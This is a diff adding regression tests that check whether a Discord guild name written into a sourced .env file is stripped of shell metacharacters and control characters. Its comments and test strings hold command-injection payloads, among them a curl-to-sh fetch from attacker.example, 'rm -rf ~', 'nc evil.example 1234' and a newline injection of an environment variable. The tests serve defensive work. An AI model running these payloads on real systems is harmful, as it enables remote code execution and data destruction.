@@ -3,6 +3,7 @@ import test from "node:test";
 import { mkdtempSync, writeFileSync, readFileSync, existsSync, mkdirSync, statSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
+import { execFileSync } from "node:child_process";
 import {
   validateDiscordRoleIds,
   readDiscordBotSettingsState,
@@ -574,6 +575,73 @@ test("persistHostedBotConnectedGuild trims and length-caps a free-text guild nam
 
   delete process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_ID;
   delete process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_NAME;
+});
+
+// dune-awakening-selfhost-docker#870 (CRITICAL, found by automated review
+// on already-merged #801): the guild display name is Discord-controlled
+// free text (settable by anyone with Manage Server permission in a guild
+// the console operator merely owns/administers) written into .env, which
+// runtime/scripts/start-all.sh (and siblings) `. ./.env` inside
+// `set -a; ...; set +a` -- a real bash source. The old blocklist
+// (control chars + "=") left $ and backtick completely untouched, so a
+// payload like `Evil$(curl attacker.example|sh)Server` would execute as
+// a real shell command the next time any of those scripts ran.
+test("persistHostedBotConnectedGuild strips every shell metacharacter from an attacker-controlled guild name, not just control characters and '='", () => {
+  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-hostedbot-connected-shellsafe-"));
+  // A bare apostrophe is deliberately NOT in this dangerous set -- it's
+  // legitimate in real names ("O'Brien's Server") and inert inside the
+  // double-quoted JSON.stringify() output quoteEnv() writes; `"` and `\`
+  // ARE dangerous here (they could break out of that double-quoting) and
+  // are correctly excluded by the allowlist below.
+  const payload = "Evil$(touch /tmp/pwned)`touch /tmp/pwned2`;rm -rf ~|nc evil.example 1234&<>\\'\"~*Server";
+  persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "444444444444444444", guildName: payload });
+  const persisted = process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_NAME;
+  for (const dangerous of ["$", "`", ";", "|", "&", "<", ">", "\\", "\"", "~", "*", "(", ")"]) {
+    assert.ok(!persisted.includes(dangerous), `sanitized guild name must never contain '${dangerous}': got ${JSON.stringify(persisted)}`);
+  }
+  assert.equal(persisted, "Eviltouch tmppwnedtouch tmppwned2rm -rf nc evil.example 1234'Server");
+  delete process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_ID;
+  delete process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_NAME;
+});
+
+// Layer 2 audit finding (real, found by /code-review high on this exact
+// fix, before merge): the first version of the new allowlist used `\s`
+// for whitespace, which also matches \n, \r, \t, \v, \f, and the Unicode
+// line/paragraph separators -- not just a literal space -- so a raw
+// control character in the guild name would have survived unfiltered.
+// bash sourcing doesn't unescape quoteEnv()'s JSON-escaped "\n" back to a
+// literal newline, but Docker Compose's own SEPARATE .env-file parser
+// (used for ${VAR} interpolation in docker-compose.web.yml) is documented
+// to do exactly that -- reopening a version of the exact risk #860's own
+// comment already flags as "never traced" and was guarding against
+// unconditionally.
+test("persistHostedBotConnectedGuild strips raw control characters (newline, tab, CR, vertical/form feed, Unicode line separators) from the guild name, not just shell metacharacters", () => {
+  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-hostedbot-connected-controlchars-"));
+  const lineSeparator = "\u2028";
+  const paragraphSeparator = "\u2029";
+  const payload = `Evil\nDUNE_DISCORD_ADAPTER_ENABLED=false\r\t\v\f${lineSeparator}${paragraphSeparator} Server`;
+  persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "666666666666666666", guildName: payload });
+  const persisted = process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_NAME;
+  for (const [name, char] of [["newline", "\n"], ["CR", "\r"], ["tab", "\t"], ["vertical tab", "\v"], ["form feed", "\f"], ["U+2028", lineSeparator], ["U+2029", paragraphSeparator]]) {
+    assert.ok(!persisted.includes(char), `sanitized guild name must never contain a raw ${name}: got ${JSON.stringify(persisted)}`);
+  }
+  assert.equal(persisted, "EvilDUNE_DISCORD_ADAPTER_ENABLEDfalse Server", "'=' and every control character (including the Unicode line/paragraph separators) are stripped; the underscore and the one literal space are legitimate, allowed characters and survive");
+  delete process.env.DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_NAME;
+});
+
+// Closes the loop the finding above only argues in prose: actually writes
+// a real .env file via the real persist function, then actually sources
+// it through a real `sh -c '. ./.env'` (matching start-all.sh's own
+// `set -a; . ./.env; set +a` pattern) and proves the payload never
+// executes -- a sentinel file the payload would have created must not
+// exist afterward.
+test("a real .env file written by persistHostedBotConnectedGuild is safe to actually source with sh -- the injection payload never executes", () => {
+  const dir = mkdtempSync(join(tmpdir(), "arrakis-discord-hostedbot-connected-realsource-"));
+  const sentinel = join(dir, "pwned");
+  const payload = `Evil$(touch ${sentinel})Server`;
+  persistHostedBotConnectedGuild({ repoRoot: dir }, { guildId: "555555555555555555", guildName: payload });
+  execFileSync("sh", ["-c", `set -a; . ./.env; set +a`], { cwd: dir });
+  assert.ok(!existsSync(sentinel), "sourcing the written .env file must never execute the guild name's own content as shell code");
 });
 
 test("persistHostedBotConnectedGuild is a no-op (does not write) when guildId is missing", () => {
